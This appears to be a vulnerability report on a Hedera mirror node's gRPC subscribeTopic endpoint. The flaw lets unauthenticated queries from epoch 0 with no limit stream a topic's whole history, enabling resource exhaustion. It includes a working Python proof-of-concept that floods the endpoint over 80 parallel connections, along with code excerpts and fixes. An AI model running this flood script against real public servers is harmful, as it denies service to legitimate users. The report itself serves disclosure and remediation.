### Title
Unauthenticated Unbounded Historical Topic Replay Causes Resource Exhaustion and Potential JVM OOM via `subscribeTopic()`

### Summary
Any unauthenticated external caller can send a `ConsensusTopicQuery` with `consensusStartTime` set to epoch 0 (`Timestamp{seconds=0,nanos=0}`) and `limit` omitted (proto3 default = 0), causing the server to page through and stream every historical message ever stored for the targeted topic with no termination condition. Because there is no authentication, no subscriber count cap, and no per-connection limit on the number of TCP connections, an attacker can open many parallel connections and drive the JVM heap above its 2048 MiB default limit while simultaneously exhausting the database connection pool, denying service to all legitimate users.

### Finding Description

**Entry point — no authentication:**
`ConsensusController.subscribeTopic()` carries no authentication or authorization check. The only registered `ServerInterceptor` in the production path is a test-only class that sets an endpoint-context thread-local; there is no security interceptor. [1](#0-0) [2](#0-1) 

**Filter construction — epoch 0 and limit 0 both pass validation:**
`toFilter()` maps `query.getLimit()` (proto3 default = 0) directly to `filter.limit(0)`. When `consensusStartTime` is `Timestamp{seconds=0,nanos=0}`, `convertTimestamp()` returns 0 nanoseconds and sets `startTime = 0`. [3](#0-2) 

`TopicMessageFilter` validates `limit` with `@Min(0)` (0 passes) and `startTime` with `@Min(0)` plus `isValidStartTime()` which checks `startTime <= DomainUtils.now()` — epoch 0 is always ≤ now. `hasLimit()` returns `limit > 0`, so with `limit = 0` it returns `false`, meaning **no upper bound is ever applied**. [4](#0-3) 

**Service layer — no `.take()` and no `takeWhile` applied:**
`TopicMessageServiceImpl.subscribeTopic()` only applies `flux.take(filter.getLimit())` when `filter.hasLimit()` is true, and only applies `takeWhile` when `endTime != null`. With `limit = 0` and no `endTime`, neither guard is reached. The `historical` flux is wired to page through all stored messages indefinitely. [5](#0-4) 

**Retriever — pages forever with `numRepeats = Long.MAX_VALUE`:**
`PollingTopicMessageRetriever.retrieve()` is called with `throttled = true`. In `PollingContext`, `numRepeats = Long.MAX_VALUE` and `maxPageSize = 1000`. In `poll()`, because `filter.hasLimit()` is false, `limit = Integer.MAX_VALUE`, so `pageSize = min(Integer.MAX_VALUE, 1000) = 1000`. `isComplete()` only returns `true` when the last page returns fewer than 1000 rows — meaning the retriever pages through every single historical message in 1000-row batches until the table is exhausted, then the live listener takes over indefinitely. [6](#0-5) [7](#0-6) 

**The 60-second timeout is ineffective on active topics:**
The retriever applies `.timeout(retrieverProperties.getTimeout(), scheduler)` (default 60 s), but this is a *between-emissions* timeout. On any topic with a steady message rate, messages are emitted continuously and the timeout never fires. [8](#0-7) 

**Per-connection call cap does not limit total connections:**
`maxConcurrentCallsPerConnection = 5` restricts calls per TCP connection but places no cap on the number of TCP connections an attacker may open. An attacker opening *N* TCP connections gets *5N* concurrent unbounded subscriptions. [9](#0-8) [10](#0-9) 

**`subscriberCount` is a metric gauge, not an enforcement limit:** [11](#0-10) 

### Impact Explanation

Each concurrent subscription holds a live database connection and continuously issues 1000-row queries. With *N* concurrent subscriptions all starting from epoch 0 on a high-volume topic:

- **Memory**: Each in-flight page is ~1000 messages × ≤6 KB = ~6 MB. With 400 concurrent subscriptions (80 TCP connections × 5 calls), in-flight data reaches ~2.4 GB, exceeding the default 2048 MiB JVM heap (`resources.limits.memory: 2048Mi` in the Helm chart), causing `OutOfMemoryError` and JVM crash.
- **Database**: Each subscription holds an R2DBC/JDBC connection for the duration of the poll loop. The DB connection pool is exhausted, blocking all other queries (importer, REST API, other gRPC calls).
- **CPU**: Continuous polling at 2-second intervals across hundreds of subscriptions saturates the scheduler thread pool.

The net result is a complete denial of service of the mirror node gRPC API and degradation of all dependent services. [12](#0-11) 

### Likelihood Explanation

**Preconditions**: None. The gRPC port (5600) is publicly exposed. No credentials, API keys, or special network access are required. The protobuf schema is public.

**Tooling**: A standard gRPC client (e.g., `grpcurl`, the Hedera Java/Go SDK, or a raw HTTP/2 client) suffices. The attacker needs only to know a valid topic ID (all topic IDs are public on-chain).

**Repeatability**: The attack is trivially scriptable. Opening 80 TCP connections with 5 calls each requires no special capability. The `maxRatePerEndpoint: 250` GCP backend policy (if the GCP gateway is in use) limits RPS but not concurrent long-lived streaming connections, so it does not mitigate this attack. [13](#0-12) 

### Recommendation

1. **Enforce a minimum `startTime` lookback window**: Reject or clamp `startTime` values older than a configurable maximum lookback (e.g., 7 days). Add a `@AssertTrue` validator in `TopicMessageFilter` or a check in `toFilter()`.

2. **Enforce a maximum `limit`**: Require `limit > 0` and cap it at a configurable maximum (e.g., 10,000). Change `@Min(0)` to `@Min(1)` on `limit` and add `@Max(maxLimit)`, or enforce this in `toFilter()` before building the filter.

3. **Enforce a global concurrent subscriber cap**: Replace the `subscriberCount` gauge with an enforced ceiling. Reject new subscriptions when the count exceeds the configured maximum.

4. **Add per-IP or per-connection rate limiting**: Implement a gRPC `ServerInterceptor` that tracks and limits the number of active streaming calls per source IP.

5. **Apply a hard retriever timeout**: Add a wall-clock timeout (not just an inter-emission timeout) to the historical retrieval phase so that a single subscription cannot hold a DB connection indefinitely.

### Proof of Concept

```python
# Requires: pip install grpcio grpcio-tools hedera-sdk or raw proto compilation
# Targets: grpc://<mirror-node-host>:5600

import grpc
import threading
from com.hedera.mirror.api.proto import consensus_service_pb2, consensus_service_pb2_grpc
from proto import timestamp_pb2, basic_types_pb2

TARGET = "<mirror-node-host>:5600"
TOPIC_NUM = <known_high_volume_topic_num>   # e.g., 0.0.1234 on mainnet
NUM_CONNECTIONS = 80
CALLS_PER_CONNECTION = 5

def flood(conn_id):
    channel = grpc.insecure_channel(TARGET)
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=TOPIC_NUM),
        consensusStartTime=timestamp_pb2.Timestamp(seconds=0, nanos=0),
        # limit intentionally omitted (defaults to 0 = unlimited)
    )
    streams = []
    for _ in range(CALLS_PER_CONNECTION):
        # Each call opens an unbounded streaming subscription from epoch 0
        stream = stub.subscribeTopic(query)
        streams.append(stream)
    # Drain all streams concurrently to keep connections alive
    for s in streams:
        for _ in s:
            pass  # consume indefinitely

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
for t in threads:
    t.join()

# Expected result:
# - gRPC server memory climbs to OOM (>2048 MiB) and JVM crashes, OR
# - DB connection pool exhausted, all subsequent gRPC/REST queries return errors
```

**Steps**:
1. Identify any valid topic ID with a large message history (public information from the Hedera explorer).
2. Run the script against the public gRPC endpoint (port 5600).
3. Observe: server-side memory grows proportionally to concurrent subscriptions; DB connection errors appear in logs; legitimate subscribers receive errors or timeouts; JVM OOM crash occurs when heap is exhausted.

    private TopicMessageFilter toFilter(ConsensusTopicQuery query) {
        final var filter = TopicMessageFilter.builder().limit(query.getLimit());

        if (query.hasTopicID()) {
            filter.topicId(EntityId.of(query.getTopicID()));
        }

        if (query.hasConsensusStartTime()) {
            long startTime = convertTimestamp(query.getConsensusStartTime());
            filter.startTime(startTime);
        }

        if (query.hasConsensusEndTime()) {
            long endTime = convertTimestamp(query.getConsensusEndTime());
            filter.endTime(endTime);
        }

        return filter.build();
    }

    private Flux<TopicMessage> poll(PollingContext context) {
        TopicMessageFilter filter = context.getFilter();
        TopicMessage last = context.getLast();
        int limit = filter.hasLimit()
                ? (int) (filter.getLimit() - context.getTotal().get())
                : Integer.MAX_VALUE;
        int pageSize = Math.min(limit, context.getMaxPageSize());
        var startTime = last != null ? last.getConsensusTimestamp() + 1 : filter.getStartTime();
        context.getPageSize().set(0L);

        var newFilter = filter.toBuilder().limit(pageSize).startTime(startTime).build();

        log.debug("Executing query: {}", newFilter);
        return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
    }
